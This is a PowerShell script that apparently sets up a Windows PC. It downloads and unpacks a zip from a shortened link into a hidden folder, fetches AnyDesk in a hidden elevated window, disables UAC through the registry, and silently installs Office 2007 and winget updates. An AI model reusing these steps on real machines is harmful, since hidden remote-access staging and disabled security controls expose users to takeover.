Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

$TOOL = {"C:\TOOL"}

[System.IO.Directory]::CreateDirectory($TOOL)
$TOOLFOLDER = Get-Item $TOOL 
$TOOLFOLDER.Attributes = "Hidden" 

$webClient = New-Object -TypeName System.Net.WebClient
$task = $webClient.DownloadFileTaskAsync("https://seulink.net/TOOLZIP", "$TOOL\#TOOL#ZIP.zip")

Register-ObjectEvent -InputObject $webClient -EventName DownloadProgressChanged -SourceIdentifier WebClient.DownloadProgressChanged | Out-Null

Start-Sleep -Seconds 3

while (!($task.IsCompleted)) {
    $EventData = Get-Event -SourceIdentifier WebClient.DownloadProgressChanged | Select-Object -ExpandProperty "SourceEventArgs" -Last 1

    $ReceivedData = ($EventData | Select-Object -ExpandProperty "BytesReceived")
    $TotalToReceive = ($EventData | Select-Object -ExpandProperty "TotalBytesToReceive")
    $TotalPercent = $EventData | Select-Object -ExpandProperty "ProgressPercentage"

    Start-Sleep -Seconds 2

function convertFileSize {
    param(
        $bytes
    )

    if ($bytes -lt 1MB) {
        return "$([Math]::Round($bytes / 1KB, 2)) KB"
    }
    elseif ($bytes -lt 1GB) {
        return "$([Math]::Round($bytes / 1MB, 2)) MB"
    }
    elseif ($bytes -lt 1TB) {
        return "$([Math]::Round($bytes / 1GB, 2)) GB"
    }
}
    Write-Progress -Activity "Downloading File" -Status "Percent Complete: $($TotalPercent)%" -CurrentOperation "Downloaded $(convertFileSize -bytes $ReceivedData) / $(convertFileSize -bytes $TotalToReceive)" -PercentComplete $TotalPercent

}

Unregister-Event -SourceIdentifier WebClient.DownloadProgressChanged
$webClient.Dispose()

Expand-Archive -LiteralPath $TOOL\#TOOL#ZIP.zip -DestinationPath $TOOL

Start-Process powershell -Verb runAs -WindowStyle hidden {iwr -Uri "https://download.anydesk.com/AnyDesk-CM.exe" -OutFile "$TOOL\#TOOL#ZIP\AnyDesk.exe"}

REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

del $TOOL\#TOOL#ZIP.zip

Invoke-Command -ScriptBlock {Start-Process "$TOOL\OFFICE\2007\SaveAsPdf.EXE" -ArgumentList "/quiet" -Wait}

msiexec /i $TOOL\OFFICE\2007\ODF\OdfAddInForOfficeSetup.msi /q ALLUSERS=1

Invoke-Command -ScriptBlock {Start-Process "$TOOL\OFFICE\2007\SETUP\setup.exe" -ArgumentList "/adminfile Silent.msp" -Wait}

Install-PackageProvider -Name NuGet -Force | Out-Null
Install-Module -Name Microsoft.WinGet.Client -Force -Repository PSGallery | Out-Null
Repair-WinGetPackageManager

winget upgrade --all --accept-source-agreements --accept-package-agreements --silent --purge --skip-dependencies --include-unknown

exit